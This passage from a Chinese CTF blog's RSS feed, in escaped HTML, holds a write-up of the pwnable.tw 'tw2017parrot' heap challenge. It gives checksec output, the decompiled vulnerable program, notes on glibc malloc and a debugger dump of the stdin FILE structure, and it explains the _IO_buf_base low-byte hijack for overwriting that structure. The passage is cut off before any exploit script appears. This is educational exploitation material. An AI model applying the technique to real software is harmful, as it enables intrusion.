class=&#34;string&#34;&gt;&amp;#x27;REMOTE&amp;#x27;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/03/22/tw2017parrot/</guid>
            <title>tw2017parrot</title>
            <link>http://example.com/2022/03/22/tw2017parrot/</link>
            <category>writeup</category>
            <pubDate>Tue, 22 Mar 2022 20:11:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h1&gt;
&lt;h1 id=&#34;i-io_buf_base劫持技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#i-io_buf_base劫持技术&#34;&gt;#&lt;/a&gt; I IO_buf_base 劫持技术，&lt;/h1&gt;
&lt;h2 id=&#34;文章写的会比较凌乱是在一边解题同时记录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文章写的会比较凌乱是在一边解题同时记录&#34;&gt;#&lt;/a&gt; 文章写的会比较凌乱，是在一边解题同时记录&lt;/h2&gt;
&lt;h2 id=&#34;环境以及保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境以及保护&#34;&gt;#&lt;/a&gt; 环境以及保护&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ strings libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt; | grep ubuntu &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GNU C &lt;span class=&#34;title function_&#34;&gt;Library&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(Ubuntu GLIBC &lt;span class=&#34;number&#34;&gt;2.23&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0u&lt;/span&gt;buntu11)&lt;/span&gt; stable release version 2.23, by Roland McGrath et al.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;https:&lt;span class=&#34;comment&#34;&gt;//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&amp;gt;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ checksec --file=tw2017parrot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/giantbranch/Desktop/pwnabletw/hijack_io_buf_base/tw2017parrot&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ file tw2017parrot &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tw2017parrot: ELF &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;-bit LSB shared object, x86&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;, version &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86&lt;span class=&#34;number&#34;&gt;-64.&lt;/span&gt;so&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; GNU/Linux &lt;span class=&#34;number&#34;&gt;2.6&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.32&lt;/span&gt;, BuildID[sha1]=&lt;span class=&#34;number&#34;&gt;00f&lt;/span&gt;bccd873daf9400480cbb4dbd48845f1bb97b8, not stripped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ubuntu2.23 下的题目，只有 canary 保护没有开启，没有思路&lt;/p&gt;
&lt;h2 id=&#34;主要代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#主要代码&#34;&gt;#&lt;/a&gt; 主要代码&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl __noreturn &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-18h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *buf; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sleep(&lt;span class=&#34;number&#34;&gt;3u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%lu&amp;quot;&lt;/span&gt;, &amp;amp;size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getchar();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !size )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    buf = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Buffer:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *((_BYTE *)buf + size - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;			&lt;span class=&#34;comment&#34;&gt;//这个很关键&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, buf, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分析&#34;&gt;#&lt;/a&gt; 分析&lt;/h2&gt;
&lt;h3 id=&#34;初步印象&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#初步印象&#34;&gt;#&lt;/a&gt; 初步印象&lt;/h3&gt;
&lt;p&gt;代码很简单，malloc,free 没有多余的操作，但是 malloc 不会清空申请的堆块中的内存，同时我们可以输入空。但是只有一个堆块，紧邻 topchunk, 无法利用 unsortedbin 泄露 main_arena, 铃响其他办法&lt;/p&gt;
&lt;p&gt;malloc 的一个机制&lt;/p&gt;
&lt;p&gt;当我们在应用层调用 malloc 申请堆的时候，在 glibc 中实际上调用的是_lib_malloc 函数，但是_lib_malloc 函数只是用来简单的封装_int_malloc 函数的，_int_malloc 函数才是申请堆的核心函数。&lt;br&gt;
_int_malloc 会根据应用层用户申请的内存块大小，从而分配相应的 chunk 给用户使用。&lt;/p&gt;
&lt;p&gt;函数的分配堆内存的主要执行流程&lt;br&gt;
①请求大小在 fastbin 的范围内：在 fastbins 中找是否有对应的 chunk 可以使用。&lt;br&gt;
②请求大小在 smallbin 的范围内：在 smallbin 中找是否有对应的 chunk 可以使用。&lt;br&gt;
③请求大小在 largebin 的范围内：先调用 malloc_consolidate 对 fastbins 进行整理加入 unsortedbins。然后在 unsortedbin 中查看是否有满足要求的 chunk 可以使用。&lt;br&gt;
④在 largebin 中寻找可用的 chunk 来使用。&lt;br&gt;
⑤寻找较大的 bin 链中是否有可用的 chunk 来使用。&lt;br&gt;
⑥切割 topchunk 来使用。&lt;br&gt;
⑦topchunk 也不够了，再次调用 malloc_consolidate 整理 fastbins。&lt;br&gt;
⑧topchunk 不够用，再次 malloc_consolidate 之后还没有可以用的，最终调用 sysmalloc（系统调用）申请内存。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *)&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;-72540021&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x7f0883e32964&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;132&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x7f0883e32964&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;132&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x7f0883e32963&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x7f0883e32963&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x7f0883e32963&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x7f0883e32963&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x7f0883e32963&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x7f0883e32964&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;132&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x7f0883e34790&lt;/span&gt; &amp;lt;_IO_stdfile_0_lock&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x7f0883e329c0&lt;/span&gt; &amp;lt;_IO_wide_data_0&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7f0883e316e0&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这是正常的 stdin 的 IO_FILE_plus 结构体，_IO_buf_base 是输入缓冲区开始的地方（其实应该是 read_base 是开始的地方，但是这里肯可能是说 read_base = buf_base），记得程序代码那个末尾写 0 吗。在这里将 _IO_buf_base 最低位改为 0. 这个地址其实是_IO_write_base, 这里就可以实现_IO_FILE_plus 的覆盖&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span 